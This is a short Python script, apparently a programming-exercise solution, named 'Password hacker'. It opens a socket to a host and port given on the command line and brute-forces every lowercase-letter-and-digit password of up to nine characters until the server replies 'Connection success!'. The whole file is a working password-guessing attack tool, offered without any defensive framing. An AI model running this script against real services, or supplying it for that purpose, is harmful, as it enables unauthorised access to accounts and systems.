import argparse
import socket
import itertools
import string


class MySocket:
    def __init__(self, host=None, port=None):
        if host is None:
            self.host = '127.0.0.1'
        else:
            self.host = host
        if port is None:
            self.port = 3030
        else:
            self.port = port
        self.brute_pass_iterator = None

    def send_data(self, data):
        with socket.socket() as client_socket:
            address = (self.host, self.port)
            client_socket.connect(address)
            data = data.encode()
            client_socket.send(data)
            response = client_socket.recv(1024)
            response = response.decode()
            return response

    def set_iterable(self, length):
        lowers = string.ascii_lowercase
        numbers = string.digits
        valid_chars = list(itertools.chain(lowers, numbers))
        self.brute_pass_iterator = itertools.product(valid_chars, repeat=length)

    def brute_force(self):
        with socket.socket() as client_socket:
            address = (self.host, self.port)
            client_socket.connect(address)
            while True:
                for pw_length in range(1, 10):
                    self.set_iterable(pw_length)
                    for pw in self.brute_pass_iterator:
                        data = ''.join(pw)
                        client_socket.send(data.encode())
                        response = client_socket.recv(1024)
                        response = response.decode()
                        if response == 'Connection success!':
                            client_socket.close()
                            return data


def password_hacker():
    parser = argparse.ArgumentParser(description='Password hacker')
    parser.add_argument('host', nargs='?')
    parser.add_argument('port', nargs='?')
    args = parser.parse_args()
    if args.host and args.port:
        sender = MySocket(args.host, int(args.port))
        # print(sender.send_data(args.data))
        print(sender.brute_force())
    else:
        print(f'Args not supplied')


if __name__ == '__main__':
    password_hacker()
